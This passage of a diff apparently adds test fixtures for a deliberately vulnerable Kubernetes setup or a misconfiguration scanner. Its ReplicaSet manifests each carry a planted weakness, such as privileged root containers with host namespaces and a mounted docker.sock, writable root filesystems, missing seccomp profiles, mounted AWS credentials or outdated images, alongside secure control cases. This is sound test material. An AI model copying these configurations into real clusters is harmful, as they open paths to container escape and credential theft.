+         "runAsNonRoot": false
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-writable-rootfs-5lnqvqslx8",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-writable-rootfs"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-writable-rootfs",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-writable-rootfs"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-writable-rootfs"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": false,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-no-seccomp-f9rqlhlzsk",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-seccomp"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-no-seccomp",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-no-seccomp"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-no-seccomp"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-no-limits-xknd6nr2bq",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-limits"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-no-limits",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-no-limits"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-no-limits"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-sa-automount-ctb8fvvkfr",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-sa-automount"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-sa-automount",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-sa-automount"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-sa-automount"
+      }
+     },
+     "spec": {
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-latest-tag-g9b5nhndlt",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-latest-tag"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-latest-tag",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-latest-tag"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-latest-tag"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:latest",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-untagged-image-4jrmzqnj8k",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-untagged-image"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-untagged-image",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-untagged-image"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-untagged-image"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-sshd-vrgd62z4m8",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-sshd"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-sshd",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-sshd"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-sshd"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "command": [
+         "/usr/sbin/sshd",
+         "-D"
+        ]
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-init-privileged-rnrwf4ttcc",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-init-privileged"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-init-privileged",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-init-privileged"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-init-privileged"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "initContainers": [
+       {
+        "name": "init",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "privileged": true,
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-kitchen-sink-8k76gdlct8",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-kitchen-sink"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-kitchen-sink",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-kitchen-sink"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-kitchen-sink"
+      }
+     },
+     "spec": {
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:latest",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": false,
+         "capabilities": {},
+         "privileged": true,
+         "runAsUser": 0,
+         "runAsNonRoot": false
+        },
+        "volumeMounts": [
+         {
+          "name": "d",
+          "mountPath": "/var/run/docker.sock"
+         }
+        ]
+       }
+      ],
+      "hostPID": true,
+      "hostNetwork": true,
+      "hostIPC": true,
+      "volumes": [
+       {
+        "name": "d",
+        "hostPath": {
+         "path": "/var/run/docker.sock"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-host-port-w44sdncv9r",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-port"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-host-port",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-port"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-port"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "ports": [
+         {
+          "containerPort": 8080,
+          "hostPort": 8080
+         }
+        ]
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-share-process-7jjlrt2vpp",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-share-process"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-share-process",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-share-process"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-share-process"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "shareProcessNamespace": true
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-no-security-context-qjnnmrnlw6",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-security-context"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-no-security-context",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-no-security-context"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-no-security-context"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-host-process-94c76sg467",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-process"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-host-process",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-process"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-process"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "windowsOptions": {
+          "hostProcess": true
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-default-ns-hld8qb8qq2",
+    "namespace": "default",
+    "labels": {
+     "app": "wl-default-ns"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-default-ns",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-default-ns"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-default-ns"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "sec-env-secret-fl9qmk7mdx",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "sec-env-secret"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "sec-env-secret",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "sec-env-secret"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "sec-env-secret"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "env": [
+         {
+          "name": "DB_PASSWORD",
+          "valueFrom": {
+           "secretKeyRef": {
+            "name": "db-credentials",
+            "key": "password"
+           }
+          }
+         }
+        ]
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "sec-cloud-creds-7hkbdqxxqk",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "sec-cloud-creds"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "sec-cloud-creds",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "sec-cloud-creds"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "sec-cloud-creds"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "c",
+          "mountPath": "/root/.aws/credentials",
+          "subPath": "credentials"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "c",
+        "secret": {
+         "secretName": "aws-credentials"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "neg-secret-as-file-stswg62hkm",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-secret-as-file"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "neg-secret-as-file",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "neg-secret-as-file"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-secret-as-file"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "s",
+          "mountPath": "/etc/app/secrets",
+          "readOnly": true
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "s",
+        "secret": {
+         "secretName": "db-credentials"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "as-fanout-a-mz2x28bqsl",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "as-fanout-a"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "as-fanout-a",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "as-fanout-a"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "as-fanout-a"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "shared-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "as-fanout-b-dwqjxtr79g",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "as-fanout-b"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "as-fanout-b",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "as-fanout-b"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "as-fanout-b"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "shared-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "as-fanout-c-pggnbh98bb",
+    "namespace": "dvka-baseline",
+    "labels": {
+     "app": "as-fanout-c"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "as-fanout-c",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "as-fanout-c"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "as-fanout-c"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "shared-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "neg-pair-a-4nj56zdndb",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-pair-a"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "neg-pair-a",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "neg-pair-a"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-pair-a"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "pair-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "neg-pair-b-s5ll7qdxqt",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-pair-b"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "neg-pair-b",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "neg-pair-b"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-pair-b"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "pair-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "gap-cve-image-krnch2f5ln",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-cve-image"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "gap-cve-image",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "gap-cve-image"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "gap-cve-image"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "nginx:1.14.0",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
